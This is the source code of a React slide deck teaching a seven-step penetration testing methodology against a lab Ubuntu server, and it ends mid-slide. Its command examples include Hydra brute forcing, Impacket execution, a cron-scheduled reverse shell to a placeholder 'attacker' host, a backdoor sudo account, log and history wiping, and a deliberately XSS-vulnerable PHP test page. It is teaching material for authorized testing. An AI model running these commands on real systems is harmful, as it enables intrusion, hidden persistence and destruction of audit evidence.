'use client';

import { useState } from 'react';
import { ChevronLeft, ChevronRight, Shield, Search, Lock, Key, Eraser, FileText, ShieldCheck, Terminal, AlertTriangle, Target, Server } from 'lucide-react';

const slides = [
  {
    id: 0,
    title: "Penetration Testing",
    subtitle: "7 Steps with Practical Demonstrations",
    type: "title",
    content: (
      <div className="text-center">
        <Shield className="w-32 h-32 mx-auto mb-8 text-red-600" />
        <h1 className="text-7xl font-bold mb-6">Penetration Testing</h1>
        <h2 className="text-4xl text-gray-600 mb-8">Complete 7-Step Methodology</h2>
        <div className="text-2xl text-gray-500">
          <p className="mb-4">Attacker: Kali Linux</p>
          <p>Target: Ubuntu Server v22.04</p>
        </div>
      </div>
    )
  },
  {
    id: 1,
    title: "Overview: 7 Steps of Penetration Testing",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-12 text-center">The 7 Steps</h2>
        <div className="grid grid-cols-1 gap-6 max-w-5xl mx-auto">
          {[
            { num: "1", name: "Reconnaissance", icon: <Search className="w-10 h-10" />, desc: "Information gathering" },
            { num: "2", name: "Scanning", icon: <Target className="w-10 h-10" />, desc: "Identifying vulnerabilities" },
            { num: "3", name: "Gaining Access", icon: <Lock className="w-10 h-10" />, desc: "Exploiting weaknesses" },
            { num: "4", name: "Maintaining Access", icon: <Key className="w-10 h-10" />, desc: "Establishing persistence" },
            { num: "5", name: "Clearing Tracks", icon: <Eraser className="w-10 h-10" />, desc: "Removing evidence" },
            { num: "6", name: "Reporting", icon: <FileText className="w-10 h-10" />, desc: "Documenting findings" },
            { num: "7", name: "Remediation", icon: <ShieldCheck className="w-10 h-10" />, desc: "Securing the system" }
          ].map((step) => (
            <div key={step.num} className="flex items-center bg-gradient-to-r from-blue-50 to-indigo-50 p-6 rounded-lg border-2 border-blue-200 shadow-lg">
              <div className="flex-shrink-0 w-16 h-16 bg-blue-600 text-white rounded-full flex items-center justify-center text-2xl font-bold mr-6">
                {step.num}
              </div>
              <div className="flex items-center flex-1">
                <div className="text-blue-600 mr-4">{step.icon}</div>
                <div>
                  <h3 className="text-2xl font-bold text-gray-800">{step.name}</h3>
                  <p className="text-gray-600 text-lg">{step.desc}</p>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    )
  },
  {
    id: 2,
    title: "Test Environment Setup",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-12 text-center">Environment Setup</h2>
        <div className="grid grid-cols-2 gap-12 max-w-6xl mx-auto">
          <div className="bg-red-50 p-8 rounded-xl border-4 border-red-300 shadow-xl">
            <div className="flex items-center justify-center mb-6">
              <Terminal className="w-16 h-16 text-red-600" />
            </div>
            <h3 className="text-3xl font-bold text-center mb-6 text-red-700">Attacker Machine</h3>
            <div className="space-y-4 text-xl">
              <p><strong>OS:</strong> Kali Linux</p>
              <p><strong>Role:</strong> Penetration Testing Platform</p>
              <p className="text-lg mt-6 font-semibold">Tools Used:</p>
              <ul className="list-disc list-inside space-y-2 text-lg">
                <li>Burp Collaborator</li>
                <li>Vega Scanner</li>
                <li>Censys</li>
                <li>EyeWitness</li>
                <li>Impacket scripts</li>
              </ul>
            </div>
          </div>
          <div className="bg-blue-50 p-8 rounded-xl border-4 border-blue-300 shadow-xl">
            <div className="flex items-center justify-center mb-6">
              <Server className="w-16 h-16 text-blue-600" />
            </div>
            <h3 className="text-3xl font-bold text-center mb-6 text-blue-700">Target Machine</h3>
            <div className="space-y-4 text-xl">
              <p><strong>OS:</strong> Ubuntu Server v22.04</p>
              <p><strong>Role:</strong> Vulnerable Target</p>
              <p className="text-lg mt-6 font-semibold">Services Tested:</p>
              <ul className="list-disc list-inside space-y-2 text-lg">
                <li>Local file system ACLs</li>
                <li>Web services (HTTP/HTTPS)</li>
                <li>SMB/CIFS shares</li>
                <li>SSH service</li>
                <li>Database services</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 3,
    title: "Step 1: Reconnaissance",
    type: "content",
    content: (
      <div>
        <div className="flex items-center justify-center mb-8">
          <div className="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl font-bold mr-6">1</div>
          <h2 className="text-6xl font-bold">Reconnaissance</h2>
        </div>
        <p className="text-2xl text-center mb-12 text-gray-600">Information gathering about the target system</p>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="bg-white p-6 rounded-lg shadow-lg border-2 border-gray-200">
            <h3 className="text-3xl font-bold mb-6 text-blue-700">Tools & Techniques</h3>
            <div className="space-y-4">
              <div className="bg-blue-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🔍 Censys</h4>
                <p className="text-lg">Internet-wide asset discovery and enumeration</p>
              </div>
              <div className="bg-blue-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">👁️ EyeWitness</h4>
                <p className="text-lg">Screenshot web services and identify default credentials</p>
              </div>
              <div className="bg-blue-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🔎 WHOIS Lookup</h4>
                <p className="text-lg">Domain registration and ownership information</p>
              </div>
              <div className="bg-blue-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🌐 DNS Enumeration</h4>
                <p className="text-lg">Discover subdomains and DNS records</p>
              </div>
            </div>
          </div>

          <div className="bg-gray-900 text-green-400 p-6 rounded-lg shadow-lg font-mono text-sm">
            <h3 className="text-2xl font-bold mb-4 text-white">Command Examples</h3>
            <div className="space-y-4">
              <div>
                <p className="text-gray-400 mb-1"># DNS reconnaissance</p>
                <p>$ dig target.com ANY</p>
                <p>$ dnsrecon -d target.com</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># WHOIS information</p>
                <p>$ whois target.com</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># EyeWitness screenshot</p>
                <p>$ eyewitness --web \\</p>
                <p className="ml-4">-f urls.txt \\</p>
                <p className="ml-4">-d screenshots</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Censys search (via API)</p>
                <p>$ censys search "target.com"</p>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 bg-yellow-50 border-l-4 border-yellow-500 p-6 max-w-6xl mx-auto">
          <p className="text-xl"><strong>Objective:</strong> Gather as much information as possible without directly interacting with the target system (passive reconnaissance)</p>
        </div>
      </div>
    )
  },
  {
    id: 4,
    title: "Step 2: Scanning",
    type: "content",
    content: (
      <div>
        <div className="flex items-center justify-center mb-8">
          <div className="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl font-bold mr-6">2</div>
          <h2 className="text-6xl font-bold">Scanning</h2>
        </div>
        <p className="text-2xl text-center mb-12 text-gray-600">Active probing to identify vulnerabilities and services</p>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="bg-white p-6 rounded-lg shadow-lg border-2 border-gray-200">
            <h3 className="text-3xl font-bold mb-6 text-blue-700">Tools & Techniques</h3>
            <div className="space-y-4">
              <div className="bg-purple-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🕷️ Vega Scanner</h4>
                <p className="text-lg">Web application vulnerability scanner (XSS, SQLi, etc.)</p>
              </div>
              <div className="bg-purple-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🔥 Burp Suite</h4>
                <p className="text-lg">Web proxy for intercepting and analyzing traffic</p>
              </div>
              <div className="bg-purple-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">📡 Nmap</h4>
                <p className="text-lg">Network port scanning and service detection</p>
              </div>
              <div className="bg-purple-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🔍 Nikto</h4>
                <p className="text-lg">Web server scanner for misconfigurations</p>
              </div>
            </div>
          </div>

          <div className="bg-gray-900 text-green-400 p-6 rounded-lg shadow-lg font-mono text-sm">
            <h3 className="text-2xl font-bold mb-4 text-white">Command Examples</h3>
            <div className="space-y-4">
              <div>
                <p className="text-gray-400 mb-1"># Comprehensive Nmap scan</p>
                <p>$ nmap -sV -sC -p- \\</p>
                <p className="ml-4">192.168.1.100</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Vega GUI scanner</p>
                <p>$ vega</p>
                <p className="text-gray-500"># Set target URL in GUI</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Nikto web scan</p>
                <p>$ nikto -h http://192.168.1.100</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Burp Collaborator</p>
                <p>$ burpsuite</p>
                <p className="text-gray-500"># Use Collaborator for</p>
                <p className="text-gray-500"># SSRF/XXE detection</p>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 bg-yellow-50 border-l-4 border-yellow-500 p-6 max-w-6xl mx-auto">
          <p className="text-xl"><strong>Objective:</strong> Identify open ports, running services, and potential vulnerabilities through active scanning</p>
        </div>
      </div>
    )
  },
  {
    id: 5,
    title: "Step 3: Gaining Access",
    type: "content",
    content: (
      <div>
        <div className="flex items-center justify-center mb-8">
          <div className="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl font-bold mr-6">3</div>
          <h2 className="text-6xl font-bold">Gaining Access</h2>
        </div>
        <p className="text-2xl text-center mb-12 text-gray-600">Exploiting vulnerabilities to penetrate the system</p>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="bg-white p-6 rounded-lg shadow-lg border-2 border-gray-200">
            <h3 className="text-3xl font-bold mb-6 text-blue-700">Tools & Techniques</h3>
            <div className="space-y-4">
              <div className="bg-red-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">⚔️ Impacket Scripts</h4>
                <p className="text-lg">SMB exploitation (psexec, smbexec, wmiexec)</p>
              </div>
              <div className="bg-red-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">💣 Metasploit</h4>
                <p className="text-lg">Exploit framework for various vulnerabilities</p>
              </div>
              <div className="bg-red-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🔑 Hydra</h4>
                <p className="text-lg">Brute-force password attacks</p>
              </div>
              <div className="bg-red-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">💉 SQLMap</h4>
                <p className="text-lg">Automated SQL injection exploitation</p>
              </div>
            </div>
          </div>

          <div className="bg-gray-900 text-green-400 p-6 rounded-lg shadow-lg font-mono text-sm">
            <h3 className="text-2xl font-bold mb-4 text-white">Command Examples</h3>
            <div className="space-y-4">
              <div>
                <p className="text-gray-400 mb-1"># Impacket psexec</p>
                <p>$ psexec.py user:pass@192.168.1.100</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Impacket smbexec</p>
                <p>$ smbexec.py domain/user:pass\\</p>
                <p className="ml-4">@192.168.1.100</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># SSH brute force with Hydra</p>
                <p>$ hydra -l admin \\</p>
                <p className="ml-4">-P passwords.txt \\</p>
                <p className="ml-4">ssh://192.168.1.100</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># SQL injection</p>
                <p>$ sqlmap -u "http://target/page?id=1" \\</p>
                <p className="ml-4">--dbs --batch</p>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 bg-red-50 border-l-4 border-red-500 p-6 max-w-6xl mx-auto">
          <p className="text-xl"><strong>⚠️ Warning:</strong> This phase involves actual system compromise. Only perform on authorized systems with proper permissions.</p>
        </div>
      </div>
    )
  },
  {
    id: 6,
    title: "Step 4: Maintaining Access",
    type: "content",
    content: (
      <div>
        <div className="flex items-center justify-center mb-8">
          <div className="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl font-bold mr-6">4</div>
          <h2 className="text-6xl font-bold">Maintaining Access</h2>
        </div>
        <p className="text-2xl text-center mb-12 text-gray-600">Establishing persistent presence on the compromised system</p>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="bg-white p-6 rounded-lg shadow-lg border-2 border-gray-200">
            <h3 className="text-3xl font-bold mb-6 text-blue-700">Tools & Techniques</h3>
            <div className="space-y-4">
              <div className="bg-indigo-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🔐 SSH Key Installation</h4>
                <p className="text-lg">Add attacker's public key to authorized_keys</p>
              </div>
              <div className="bg-indigo-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">👤 Backdoor Accounts</h4>
                <p className="text-lg">Create hidden user accounts with sudo privileges</p>
              </div>
              <div className="bg-indigo-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">⏰ Cron Jobs</h4>
                <p className="text-lg">Schedule reverse shell connections</p>
              </div>
              <div className="bg-indigo-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🐚 Webshells</h4>
                <p className="text-lg">Upload PHP/ASP webshells to web directories</p>
              </div>
            </div>
          </div>

          <div className="bg-gray-900 text-green-400 p-6 rounded-lg shadow-lg font-mono text-sm">
            <h3 className="text-2xl font-bold mb-4 text-white">Command Examples</h3>
            <div className="space-y-4">
              <div>
                <p className="text-gray-400 mb-1"># Add SSH key for persistence</p>
                <p>$ echo "ssh-rsa AAAA..." &gt;&gt; \\</p>
                <p className="ml-4">~/.ssh/authorized_keys</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Create backdoor user</p>
                <p>$ useradd -m -s /bin/bash \\</p>
                <p className="ml-4">-G sudo backdoor</p>
                <p>$ passwd backdoor</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Cron job reverse shell</p>
                <p>$ (crontab -l; echo "*/5 * * * * \\</p>
                <p className="ml-4">/bin/bash -c 'bash -i &gt;&amp; \\</p>
                <p className="ml-4">/dev/tcp/attacker/4444 0&gt;&amp;1'") \\</p>
                <p className="ml-4">| crontab -</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Upload webshell</p>
                <p>$ cp shell.php /var/www/html/</p>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 bg-yellow-50 border-l-4 border-yellow-500 p-6 max-w-6xl mx-auto">
          <p className="text-xl"><strong>Objective:</strong> Establish multiple persistence mechanisms to retain access even after reboots or password changes</p>
        </div>
      </div>
    )
  },
  {
    id: 7,
    title: "Step 5: Clearing Tracks",
    type: "content",
    content: (
      <div>
        <div className="flex items-center justify-center mb-8">
          <div className="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl font-bold mr-6">5</div>
          <h2 className="text-6xl font-bold">Clearing Tracks</h2>
        </div>
        <p className="text-2xl text-center mb-12 text-gray-600">Removing evidence of compromise and activities</p>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="bg-white p-6 rounded-lg shadow-lg border-2 border-gray-200">
            <h3 className="text-3xl font-bold mb-6 text-blue-700">Tools & Techniques</h3>
            <div className="space-y-4">
              <div className="bg-gray-100 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">📝 Log Manipulation</h4>
                <p className="text-lg">Clear or modify system logs (auth.log, syslog)</p>
              </div>
              <div className="bg-gray-100 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🧹 History Clearing</h4>
                <p className="text-lg">Remove bash history and command traces</p>
              </div>
              <div className="bg-gray-100 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">⏰ Timestamp Modification</h4>
                <p className="text-lg">Alter file access and modification times</p>
              </div>
              <div className="bg-gray-100 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🗑️ File Deletion</h4>
                <p className="text-lg">Secure deletion of tools and artifacts</p>
              </div>
            </div>
          </div>

          <div className="bg-gray-900 text-green-400 p-6 rounded-lg shadow-lg font-mono text-sm">
            <h3 className="text-2xl font-bold mb-4 text-white">Command Examples</h3>
            <div className="space-y-4">
              <div>
                <p className="text-gray-400 mb-1"># Clear authentication logs</p>
                <p>$ echo "" &gt; /var/log/auth.log</p>
                <p>$ echo "" &gt; /var/log/syslog</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Clear bash history</p>
                <p>$ history -c</p>
                <p>$ echo "" &gt; ~/.bash_history</p>
                <p>$ unset HISTFILE</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Modify timestamps</p>
                <p>$ touch -r /etc/passwd \\</p>
                <p className="ml-4">backdoor.sh</p>
              </div>
              <div className="mt-4">
                <p className="text-gray-400 mb-1"># Secure file deletion</p>
                <p>$ shred -vfz -n 10 exploit.py</p>
                <p>$ rm -rf /tmp/tools</p>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 bg-purple-50 border-l-4 border-purple-500 p-6 max-w-6xl mx-auto">
          <p className="text-xl"><strong>Note:</strong> In authorized penetration testing, evidence preservation is often required. Coordinate with stakeholders before clearing tracks.</p>
        </div>
      </div>
    )
  },
  {
    id: 8,
    title: "Step 6: Reporting",
    type: "content",
    content: (
      <div>
        <div className="flex items-center justify-center mb-8">
          <div className="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl font-bold mr-6">6</div>
          <h2 className="text-6xl font-bold">Reporting</h2>
        </div>
        <p className="text-2xl text-center mb-12 text-gray-600">Documenting findings and creating actionable reports</p>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="bg-white p-6 rounded-lg shadow-lg border-2 border-gray-200">
            <h3 className="text-3xl font-bold mb-6 text-blue-700">Tools & Techniques</h3>
            <div className="space-y-4">
              <div className="bg-green-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">📊 Dradis Framework</h4>
                <p className="text-lg">Collaborative reporting and information sharing</p>
              </div>
              <div className="bg-green-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">📝 Faraday</h4>
                <p className="text-lg">Integrated pentesting environment with reporting</p>
              </div>
              <div className="bg-green-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">📄 Metasploit Pro</h4>
                <p className="text-lg">Automated report generation with evidence</p>
              </div>
              <div className="bg-green-50 p-4 rounded">
                <h4 className="font-bold text-xl mb-2">🎨 Custom Reports</h4>
                <p className="text-lg">LaTeX, Markdown, or Word templates</p>
              </div>
            </div>
          </div>

          <div className="bg-white p-6 rounded-lg shadow-lg border-2 border-blue-200">
            <h3 className="text-3xl font-bold mb-6 text-blue-700">Report Components</h3>
            <div className="space-y-4">
              <div className="border-l-4 border-blue-500 pl-4">
                <h4 className="font-bold text-xl mb-2">1. Executive Summary</h4>
                <p className="text-lg">High-level overview for management</p>
              </div>
              <div className="border-l-4 border-blue-500 pl-4">
                <h4 className="font-bold text-xl mb-2">2. Methodology</h4>
                <p className="text-lg">Testing approach and scope</p>
              </div>
              <div className="border-l-4 border-blue-500 pl-4">
                <h4 className="font-bold text-xl mb-2">3. Findings</h4>
                <p className="text-lg">Detailed vulnerability descriptions with CVSS scores</p>
              </div>
              <div className="border-l-4 border-blue-500 pl-4">
                <h4 className="font-bold text-xl mb-2">4. Evidence</h4>
                <p className="text-lg">Screenshots, logs, and proof of concept</p>
              </div>
              <div className="border-l-4 border-blue-500 pl-4">
                <h4 className="font-bold text-xl mb-2">5. Recommendations</h4>
                <p className="text-lg">Remediation steps with priority levels</p>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 bg-blue-50 border-l-4 border-blue-500 p-6 max-w-6xl mx-auto">
          <p className="text-xl"><strong>Best Practice:</strong> Use CVSS scoring for vulnerabilities, include risk ratings (Critical/High/Medium/Low), and provide clear remediation guidance</p>
        </div>
      </div>
    )
  },
  {
    id: 9,
    title: "Step 7: Remediation",
    type: "content",
    content: (
      <div>
        <div className="flex items-center justify-center mb-8">
          <div className="w-20 h-20 bg-blue-600 text-white rounded-full flex items-center justify-center text-3xl font-bold mr-6">7</div>
          <h2 className="text-6xl font-bold">Remediation</h2>
        </div>
        <p className="text-2xl text-center mb-12 text-gray-600">Securing the system and fixing identified vulnerabilities</p>

        <div className="max-w-6xl mx-auto space-y-6">
          <div className="bg-white p-6 rounded-lg shadow-lg border-2 border-gray-200">
            <h3 className="text-3xl font-bold mb-6 text-green-700">Security Hardening Techniques</h3>
            <div className="grid grid-cols-2 gap-6">
              <div className="space-y-4">
                <div className="bg-green-50 p-4 rounded">
                  <h4 className="font-bold text-xl mb-2">🔒 File System Security</h4>
                  <ul className="list-disc list-inside text-lg space-y-2">
                    <li>Configure proper ACLs with setfacl</li>
                    <li>Set secure permissions (chmod 600)</li>
                    <li>Remove world-readable files</li>
                    <li>Enable AppArmor/SELinux</li>
                  </ul>
                </div>
                <div className="bg-green-50 p-4 rounded">
                  <h4 className="font-bold text-xl mb-2">🛡️ Network Security</h4>
                  <ul className="list-disc list-inside text-lg space-y-2">
                    <li>Configure UFW/iptables firewall</li>
                    <li>Disable unnecessary services</li>
                    <li>Implement fail2ban</li>
                    <li>Enable SSH key authentication only</li>
                  </ul>
                </div>
              </div>
              <div className="space-y-4">
                <div className="bg-green-50 p-4 rounded">
                  <h4 className="font-bold text-xl mb-2">🔐 Access Control</h4>
                  <ul className="list-disc list-inside text-lg space-y-2">
                    <li>Enforce strong password policies</li>
                    <li>Implement 2FA/MFA</li>
                    <li>Use sudo instead of root</li>
                    <li>Regular access audits</li>
                  </ul>
                </div>
                <div className="bg-green-50 p-4 rounded">
                  <h4 className="font-bold text-xl mb-2">📊 Monitoring & Logging</h4>
                  <ul className="list-disc list-inside text-lg space-y-2">
                    <li>Enable auditd for system auditing</li>
                    <li>Configure centralized logging</li>
                    <li>Set up SIEM/IDS (Wazuh, OSSEC)</li>
                    <li>Regular log reviews</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-gray-900 text-green-400 p-6 rounded-lg shadow-lg font-mono text-sm">
            <h3 className="text-2xl font-bold mb-4 text-white">Remediation Commands</h3>
            <div className="grid grid-cols-2 gap-6">
              <div className="space-y-3">
                <div>
                  <p className="text-gray-400 mb-1"># Secure file permissions</p>
                  <p>$ chmod 600 /etc/ssh/sshd_config</p>
                  <p>$ setfacl -m u:user:r /sensitive/file</p>
                </div>
                <div>
                  <p className="text-gray-400 mb-1"># Configure firewall</p>
                  <p>$ ufw default deny incoming</p>
                  <p>$ ufw allow 22/tcp</p>
                  <p>$ ufw enable</p>
                </div>
              </div>
              <div className="space-y-3">
                <div>
                  <p className="text-gray-400 mb-1"># Install fail2ban</p>
                  <p>$ apt install fail2ban</p>
                  <p>$ systemctl enable fail2ban</p>
                </div>
                <div>
                  <p className="text-gray-400 mb-1"># Enable auditd</p>
                  <p>$ apt install auditd</p>
                  <p>$ auditctl -w /etc/passwd -p wa</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 bg-green-50 border-l-4 border-green-500 p-6 max-w-6xl mx-auto">
          <p className="text-xl"><strong>Verification:</strong> After remediation, conduct a follow-up scan to verify vulnerabilities are resolved and no new issues were introduced</p>
        </div>
      </div>
    )
  },
  {
    id: 10,
    title: "Service Testing: Overview",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-12 text-center">Services Tested on Ubuntu Server</h2>
        <div className="grid grid-cols-1 gap-6 max-w-5xl mx-auto">
          {[
            {
              num: "1",
              name: "Local File System ACLs",
              desc: "Access Control Lists for file permissions",
              vuln: "Misconfigured permissions, world-readable sensitive files"
            },
            {
              num: "2",
              name: "Web Services (Apache/Nginx)",
              desc: "HTTP/HTTPS web server services",
              vuln: "XSS, SQL injection, directory traversal, outdated software"
            },
            {
              num: "3",
              name: "SMB/CIFS Shares",
              desc: "Windows file sharing protocol",
              vuln: "Anonymous access, weak passwords, EternalBlue"
            },
            {
              num: "4",
              name: "SSH Service",
              desc: "Secure Shell remote access",
              vuln: "Weak credentials, root login enabled, outdated version"
            },
            {
              num: "5",
              name: "Database Services",
              desc: "MySQL/PostgreSQL databases",
              vuln: "SQL injection, default credentials, remote access"
            }
          ].map((service) => (
            <div key={service.num} className="bg-gradient-to-r from-purple-50 to-pink-50 p-6 rounded-lg border-2 border-purple-300 shadow-lg">
              <div className="flex items-start">
                <div className="flex-shrink-0 w-16 h-16 bg-purple-600 text-white rounded-full flex items-center justify-center text-2xl font-bold mr-6">
                  {service.num}
                </div>
                <div className="flex-1">
                  <h3 className="text-2xl font-bold text-gray-800 mb-2">{service.name}</h3>
                  <p className="text-lg text-gray-600 mb-3">{service.desc}</p>
                  <div className="bg-red-100 border-l-4 border-red-500 p-3 rounded">
                    <p className="text-sm font-semibold text-red-800">Common Vulnerabilities:</p>
                    <p className="text-sm text-red-700">{service.vuln}</p>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    )
  },
  {
    id: 11,
    title: "Service 1: File System ACLs",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-8 text-center">Service 1: Local File System ACLs</h2>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto mb-8">
          <div className="bg-blue-50 p-6 rounded-lg shadow-lg border-2 border-blue-300">
            <h3 className="text-2xl font-bold mb-4 text-blue-800">Installation</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Ubuntu Server</p>
              <p>$ sudo apt update</p>
              <p>$ sudo apt install acl</p>
              <p className="mt-3">$ sudo mkdir /sensitive-data</p>
              <p>$ sudo touch /sensitive-data/secrets.txt</p>
            </div>
          </div>

          <div className="bg-red-50 p-6 rounded-lg shadow-lg border-2 border-red-300">
            <h3 className="text-2xl font-bold mb-4 text-red-800">Vulnerability Testing</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Kali Linux - Recon</p>
              <p>$ ssh user@target</p>
              <p>$ find / -perm -002 -type f 2&gt;/dev/null</p>
              <p>$ getfacl /sensitive-data/secrets.txt</p>
              <p className="mt-3"># Check for misconfigured ACLs</p>
            </div>
          </div>
        </div>

        <div className="max-w-6xl mx-auto space-y-6">
          <div className="bg-yellow-50 border-l-4 border-yellow-500 p-6">
            <h4 className="font-bold text-xl mb-3">🔍 Testing Methodology</h4>
            <ul className="list-disc list-inside space-y-2 text-lg">
              <li>Search for world-writable files</li>
              <li>Enumerate ACL permissions with getfacl</li>
              <li>Test file access with different user contexts</li>
              <li>Look for SUID/SGID binaries</li>
            </ul>
          </div>

          <div className="bg-green-50 border-l-4 border-green-500 p-6">
            <h4 className="font-bold text-xl mb-3">✅ Remediation</h4>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Set proper ACLs</p>
              <p>$ sudo setfacl -m u:admin:rw /sensitive-data/secrets.txt</p>
              <p>$ sudo setfacl -m g:developers:r /sensitive-data/secrets.txt</p>
              <p>$ sudo chmod 600 /sensitive-data/secrets.txt</p>
              <p className="mt-3"># Remove world permissions</p>
              <p>$ sudo find / -perm -002 -type f -exec chmod o-w &#123;&#125; \;</p>
            </div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 12,
    title: "Service 2: Web Services",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-8 text-center">Service 2: Web Services (Apache)</h2>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto mb-8">
          <div className="bg-blue-50 p-6 rounded-lg shadow-lg border-2 border-blue-300">
            <h3 className="text-2xl font-bold mb-4 text-blue-800">Installation</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Ubuntu Server</p>
              <p>$ sudo apt install apache2</p>
              <p>$ sudo apt install php libapache2-mod-php</p>
              <p>$ sudo systemctl start apache2</p>
              <p className="mt-3"># Create vulnerable test page</p>
              <p>$ echo '&lt;?php echo $_GET["name"]; ?&gt;' \\</p>
              <p className="ml-4">&gt; /var/www/html/test.php</p>
            </div>
          </div>

          <div className="bg-red-50 p-6 rounded-lg shadow-lg border-2 border-red-300">
            <h3 className="text-2xl font-bold mb-4 text-red-800">Vulnerability Testing</h3>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Kali Linux - Vega Scanner</p>
              <p>$ vega</p>
              <p className="text-gray-500"># GUI: Set target to http://target</p>
              <p className="text-gray-500"># Start scan for XSS, SQLi, etc.</p>
              <p className="mt-3"># Burp Suite</p>
              <p>$ burpsuite</p>
              <p className="text-gray-500"># Intercept requests</p>
              <p className="text-gray-500"># Use Collaborator for SSRF</p>
            </div>
          </div>
        </div>

        <div className="max-w-6xl mx-auto space-y-6">
          <div className="bg-yellow-50 border-l-4 border-yellow-500 p-6">
            <h4 className="font-bold text-xl mb-3">🔍 Testing with Tools</h4>
            <ul className="list-disc list-inside space-y-2 text-lg">
              <li><strong>Vega Scanner:</strong> Automated web vulnerability scanner for XSS, SQL injection</li>
              <li><strong>Burp Suite:</strong> Intercept traffic, test injections, use Collaborator for OOB</li>
              <li><strong>EyeWitness:</strong> Screenshot web services and identify technologies</li>
            </ul>
          </div>

          <div className="bg-green-50 border-l-4 border-green-500 p-6">
            <h4 className="font-bold text-xl mb-3">✅ Remediation</h4>
            <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm">
              <p className="text-gray-400 mb-2"># Input validation and sanitization</p>
              <p>$ # Use htmlspecialchars() for output</p>
              <p>$ # Prepared statements for SQL</p>
              <p className="mt-3"># Disable directory listing</p>
              <p>$ sudo a2dismod autoindex</p>
              <p className="mt-3"># Install ModSecurity WAF</p>
              <p>$ sudo apt install libapache2-mod-security2</p>
            </div>
          </div>
        </div>
      </div>
    )
  },
  {
    id: 13,
    title: "Service 3: SMB/CIFS Shares",
    type: "content",
    content: (
      <div>
        <h2 className="text-5xl font-bold mb-8 text-center">Service 3: SMB/CIFS Shares</h2>

        <div className="grid grid-cols-2 gap-8 max-w-6xl mx-auto mb-8">
